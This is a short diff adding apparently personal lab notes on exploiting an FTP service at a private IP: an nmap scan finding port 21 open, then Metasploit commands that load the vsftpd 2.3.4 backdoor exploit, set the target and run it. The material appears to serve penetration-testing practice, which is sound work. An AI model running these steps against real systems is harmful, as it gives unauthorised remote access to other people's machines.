@@ -1,0 +1,19 @@
+IP = 192.168.1.4
+
+````
+Scanning the IP using nmap
+port 21 ftp is open
+
+````
+
+```
+start msfconsole
+
+use exploit/unix/ftp/vsftpd_234_backdoor
+
+set rhosts 192.168.1.4
+
+exploit
+
+
+```
